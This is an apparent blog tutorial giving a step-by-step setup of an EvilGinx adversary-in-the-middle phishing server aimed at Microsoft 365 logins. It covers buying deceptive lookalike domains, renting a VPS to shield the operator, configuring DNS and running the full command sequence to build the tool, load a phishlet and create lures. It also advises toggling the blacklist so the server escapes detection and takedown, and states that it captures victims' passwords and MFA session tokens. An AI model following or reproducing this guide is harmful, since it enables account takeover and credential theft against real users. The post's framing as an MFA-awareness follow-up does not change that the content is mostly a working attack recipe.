---
title: "Becoming the Adversary in the Middle"
subtitle: "How-to: Setting up an EvilGinx Server"
date: 2024-05-29
author: Andy Lombardo
source: https://www.edtechirl.com/p/becoming-the-adversary-in-the-middle
---

# Becoming the Adversary in the Middle

*How-to: Setting up an EvilGinx Server*

[![](https://substackcdn.com/image/fetch/$s_!vytU!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd7a4d980-454c-4a6e-ad40-72a19416b1b0_1792x1024.webp)](https://substackcdn.com/image/fetch/$s_!vytU!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd7a4d980-454c-4a6e-ad40-72a19416b1b0_1792x1024.webp)

In a [previous article](https://www.edtechirl.com/p/why-is-phish-resistant-mfa-important) we talked about the importance of phish-resistant MFA and included a demo of bypassing MFA using the widely available program called EvilGinx. I keep coming back to EvilGinx because I’m still floored both by how powerful it is and by how simple to set up and use it is. This time, we’re going to look at what’s involved in setting up an EvilGinx server from start to finish.

1. **Purchase a domain name.** To be able to reuse it for multiple projects, think about the flexibility of subdomains. If you want to create a domain that mimics Microsoft, it’s going to be difficult to find a convincing typo’ed version. But if you get a domain like update-12-18-1-0.com, it’s endlessly flexible because you can use subdomains to turn it into onedrive.update-12-18-1-0.com AND google-drive.update-12-18-1-0.com AND o365.update-12-18-1-0.com, and on and on with the same top-level domain… For bonus points, if you get a .zip domain, it can look even more convincing. For throw-away projects, I usually purchase domains from AWS, where the .click domain is only $3/year. Another perk to AWS is that DNS changes propagate FAST.
2. **Create a cloud-based virtual private server (VPS).** Sure, technically, you could instead go with the lowest-cost method of spinning up a Linux server on your own hardware and exposing it to the internet, but using a service like Linode or Digital Ocean is quick, easy, and cheap, and also adds a layer of insulation between a hacking tool and your ISP. I’ve had a long-standing preference for using Linode, because you can set up a basic Linode server for $5/month. If you aren’t already a Linode user, you can save money while you experiment by cashing in on $100 in Linode credit that’s good for 60 days by [clicking here](https://www.linode.com/lp/refer/?r=49850bdb651dd7b02402081bdfef8fb8499a5893) for a referral code. More details on setting up Linode can be found [in this previous article](https://www.edtechirl.com/p/kasm-in-the-cloud). The server requirement is basic — I usually pick whatever the current LTS version of Ubuntu Linux is and go from there.

   *It’s worth noting that when you’re done with your VPS and power it off, it will still accrue billing charges until the machine is deleted. Just powering off does NOT stop billing.*
3. **Update the DNS settings** at your domain registrar to connect your domain name to the EvilGinx server. You’ll need a total of 2 nameserver records and 1 A record.

   1. Set the nameserver (NS) records to ns1.yourdomainname.com and ns2.yourdomainname.com (using your actual domain name after ns1. and ns2.). If you purchased your domain name on AWS, you’ll also need to change the glue records for your domain to point to the IP address of your VPS. More details on [AWS glue records can be found here](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/domain-name-servers-glue-records.html).
   2. Create an A record using the IP address of the VPS you set up in Step 2 above.
4. **Set up EvilGinx on your newly created VPS**:

Connect to the server you created. Depending on the provider, you can do this via SSH or there may be a web-based console to connect. Once you’re connected…

Update and upgrade your Linux server:

> `sudo apt update && sudo apt upgrade -y`

Install Go:

> `sudo apt install git golang-go`

Install the Make package:

> `sudo apt install make`

Clone the Github repository for EvilGinx:

> `sudo git clone https://github.com/kgretzky/evilginx2.git`

Move to the directory where your Phishlets will live:

> `cd evilginx2/phishlets`

Create a yaml configuration file for your Phishlet… In our example, we’ll use Microsoft 365 as our target, and we’ll call the Phishlet m365.yaml:

> `sudo nano m365.yaml`

Paste the content from [the yaml file found here](https://edtechirl-resources-public.s3.amazonaws.com/ginx/m365.yaml) into the m365.yaml file you just created… This yaml file is from [SimplerHacking’s GitHub found here](https://github.com/simplerhacking/Evilginx3-Phishlets). There are several sample Phishlets here, as well as a template to get started writing your own.

After pasting and saving the m365.yaml file, change back to the root of the evilginx2 directory

> `cd ..`

Compile and build your executable in Go:

> `make`

Launch EvilGinx

> `./build/evilginx -p phishlets`

At this point, you’re going to see EvilGinx launch for the first time:

[![](https://substackcdn.com/image/fetch/$s_!Kqnh!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe0b4e620-4047-4108-8f06-10f3b5ee2ad4_1534x710.png)](https://substackcdn.com/image/fetch/$s_!Kqnh!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe0b4e620-4047-4108-8f06-10f3b5ee2ad4_1534x710.png)

Next, tell EvilGinx to use your domain name (mine is pleasepleasedont.click)

> `config domain pleasepleasedont.click`

Tell EvilGinx to use your domain name with the Phishlet we created earlier

> `phishlets hostname m365 pleasepleasedont.click`

Configure the IP for your Linode/Digital Ocean server (for example this example pretend it’s this made up address: 172.256.257.258)

> `config ipv4 172.256.257.258`

Enable your Phishlet

> `phishlets enable m365`

Create the specific URL that will be used as the “lure” for your Phishlet. Note: Make sure you set up your DNS records as previously described before this step.

> `lures create m365`

By default, when EvilGinx starts it’s in Blacklist All mode — meaning no one can connect to it if they click on the lure. That’s to help prevent your server from being caught. If you leave it on 24/7, it may be identified as a malicious server and blocked or taken down by your provider or domain registrar. When you’re ready to roll, change the deny-list to either “off” or “unauth.” Unauth is preferable, because it will block any attempts to visit your base URL, but will allow attempts to your specific lure. Likewise, when you’re finished, you can turn the deny-list back on with the command “blacklist all”. Additional blacklist settings are described in the [EvilGinx docs here](https://help.evilginx.com/docs/guides/blacklist). If you don’t change the blacklist settings, anyone who visits your domain will be re-directed to [this instructional video](https://youtu.be/dQw4w9WgXcQ?si=QiLhaJ6yhgP7SMmW).

> `blacklist off`

OR

> `blacklist unauth`

At this point, if the Ginx has granted your wish, you should now have a specific URL (lure) that, when visited, will send you to a generic Microsoft login page. Once you enter your email address in the login page, it will redirect you to a page that mirror’s your domain’s login page. As you enter the password, it will be visible from your EvilGinx server. As MFA is completed, you’ll also receive the token for the session. From here, the process will look like the [process documented in our previous article.](https://www.edtechirl.com/p/why-is-phish-resistant-mfa-important)

Condensed List of Commands:

> `sudo apt update && sudo apt upgrade -y`
>
> `sudo apt install git golang-go`
>
> `sudo apt install make`
>
> `sudo git clone https://github.com/kgretzky/evilginx2.git`
>
> `cd evilginx2/phishlets`
>
> `sudo nano m365.yaml`

Paste the content from [the yaml file found here](https://edtechirl-resources-public.s3.amazonaws.com/ginx/m365.yaml) into the m365.yaml file you just created… After pasting and saving the m365.yaml file…

> `cd ..`
>
> `make`
>
> `./build/evilginx -p phishlets`
>
> `config domain [your domain name]`
>
> `phishlets hostname m365 [your domain name]`
>
> `config ipv4 x.x.x.x`
>
> `phishlets enable m365`
>
> `lures create m365`
>
> `[***update NS records first]`
>
> `blacklist off OR blacklist unauth`
